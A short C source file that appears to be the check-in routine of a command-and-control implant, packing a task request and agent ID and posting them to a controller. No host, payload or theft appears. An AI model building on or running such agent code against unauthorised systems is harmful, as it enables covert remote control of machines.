#include "../../includes/core/core.h"
#include "../../includes/byte/byte.h"
#include "../../includes/net/net.h"




BOOL Checkin() {
	if (!packager->PackerPointer() && !packager->NewPacker()) {
		return FALSE;
	}

	if (packager->PackerSize() == 0) {
		if (!packager->Pack4(MSG_GET_TASK)) { return FALSE; }
		if (!packager->Pack4(hollow->config->AgentID)) { return FALSE; }
	}

	BOOL ok = g_NetMgr->DoPost(packager->PackerPointer(), (SIZE_T)packager->PackerSize());
	if (!ok) {
		return ok;
	}
	packager->ResetPacker();
	return ok;
}